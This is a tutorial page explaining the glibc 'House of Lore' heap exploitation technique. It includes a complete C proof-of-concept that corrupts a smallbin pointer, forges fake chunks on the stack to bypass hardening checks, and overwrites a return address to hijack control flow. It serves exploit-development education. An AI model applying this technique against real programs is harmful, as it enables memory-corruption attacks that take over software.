---
title: "House of Lore"
description: "An advanced heap exploitation technique targeting the SmallBin to achieve arbitrary allocation by corrupting the BK pointer."
date: "2025-12-26"
order: 40
---

# glibc Allocator: House of Lore

## Introduction

The "House of Lore" is a classic heap exploitation technique that targets the SmallBin. By corrupting the `bk` (backward) pointer of a chunk in the SmallBin, an attacker can trick the allocator into returning an arbitrary memory address (such as a stack or `.bss` address) as a "chunk" on a subsequent `malloc` call.

While classic versions of this attack were straightforward, modern glibc versions (starting around 2.23/2.26) introduced several hardening measures:
1. **Smallbin double-linked list corruption check**: The allocator now verifies that `victim->bk->fd == victim`.
2. **tcache**: Small-sized allocations are first served from and cached in the tcache, which must be bypassed or exhausted.
3. **Smallbin-to-tcache mechanism**: When a chunk is returned from the SmallBin, other chunks in the same bin are moved to the tcache. This can trigger crashes if the fake `bk` chain is not properly terminated.

## Prerequisites
- **SmallBin Pointer Corruption**: Ability to overwrite the `bk` pointer of a chunk that is currently in a SmallBin.
- **Fake Chunk Control**: Ability to forge multiple fake chunks at the target location (to satisfy `victim->bk->fd == victim` and the `Smallbin-to-tcache` chain).
- **Known Addresses**: Knowledge of both the target memory address and the heap address is usually required.
- **T-cache Exhaustion**: The tcache for the target size must be full to force the allocator to use the SmallBin.

## Example from `house_of_lore.c`

This revisited version bypasses modern hardening checks and has been tested against glibc 2.35.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <assert.h>

void jackpot(){ fprintf(stderr, "Nice jump d00d\n"); exit(0); }

int main(int argc, char * argv[]){
  intptr_t* stack_buffer_1[4] = {0};
  intptr_t* stack_buffer_2[4] = {0};
  void* fake_freelist[7][4];

  intptr_t *victim = malloc(0x100);
  void *dummies[7];
  for(int i=0; i<7; i++) dummies[i] = malloc(0x100);

  intptr_t *victim_chunk = victim-2;

  // Forge chain on stack
  for(int i=0; i<6; i++) fake_freelist[i][3] = fake_freelist[i+1];
  fake_freelist[6][3] = NULL;

  stack_buffer_1[2] = victim_chunk;
  stack_buffer_1[3] = (intptr_t*)stack_buffer_2;
  stack_buffer_2[2] = (intptr_t*)stack_buffer_1;
  stack_buffer_2[3] = (intptr_t *)fake_freelist[0];

  malloc(1000); // barrier

  for(int i=0; i<7; i++) free(dummies[i]);
  free((void*)victim);

  malloc(1200); // trigger sorting

  // VULNERABILITY: Corrupt small bin bk
  victim[1] = (intptr_t)stack_buffer_1;

  for(int i=0; i<7; i++) malloc(0x100); // empty tcache

  malloc(0x100); // returns victim
  char *p4 = malloc(0x100); // returns stack_buffer_1

  intptr_t sc = (intptr_t)jackpot;
  long offset = (long)__builtin_frame_address(0) - (long)p4;
  memcpy((p4+offset+8), &sc, 8);

  assert((long)__builtin_return_address(0) == (long)jackpot);
  return 0;
}
```

## Attack Flow Explained

### 1. Setup and Tcache Bypassing

First, we allocate a `victim` chunk and 7 `dummies` chunks of the same size (`0x110` including header). We then free the `dummies` to fill up the tcache for this size.

When we `free(victim)`, it cannot go into the tcache (it's full) and is too small for the large bin, so it's placed in the **Unsorted Bin**. We then allocate a larger chunk (`p2`) to trigger the sorting mechanism, moving the `victim` chunk from the Unsorted Bin into the **SmallBin**.

### 2. Forging the Fake Chunk Chain

Modern glibc checks the integrity of the SmallBin list. If we want `malloc` to return our `stack_buffer_1`, the following check must pass when `victim` is deallocated:

```c
if (__glibc_unlikely (bck->fd != victim)) {
    errstr = "malloc(): smallbin double linked list corrupted";
    goto errout;
}
```

Here, `bck` is `victim->bk` (our `stack_buffer_1`). Thus, `stack_buffer_1->fd` must point back to `victim`.

Furthermore, when `stack_buffer_1` itself is about to be returned by a later `malloc`, its own `bk` (`stack_buffer_2`) will be checked: `stack_buffer_2->fd` must point back to `stack_buffer_1`.

| Pointer | Target | Purpose |
| --- | --- | --- |
| `victim->bk` | `stack_buffer_1` | Point to the stack |
| `stack_buffer_1->fd` | `victim` | Bypass first integrity check |
| `stack_buffer_1->bk` | `stack_buffer_2` | Bypass second integrity check (Step 1) |
| `stack_buffer_2->fd` | `stack_buffer_1` | Bypass second integrity check (Step 2) |

**The chain of forged pointers required to bypass glibc hardening.**

### 3. Smallbin-to-Tcache Bypass

In recent glibc versions, when a chunk is served from the SmallBin, the allocator tries to "refill" the tcache with other chunks from the same bin. It follows the `bk` chain and places those chunks into the tcache.

If we don't provide a valid chain, the allocator will follow our fake `bk` into invalid memory and crash. We bypass this by:
1. Creating a `fake_freelist` on the stack.
2. Pointing `stack_buffer_2->bk` to the start of this list.
3. Ensuring the list is properly NULL-terminated.

### 4. Arbitrary Allocation

After the vulnerability overwrites `victim->bk` with `stack_buffer_1`, we first empty the tcache. Then:
1. `malloc(0x100)`: Returns the original `victim` chunk. The SmallBin's `bk` now points to `stack_buffer_1`.
2. `malloc(0x100)`: Returns `stack_buffer_1`. This is our arbitrary allocation on the stack!

We can now use this stack pointer to overwrite the saved return address (or other sensitive data) and hijack control flow.
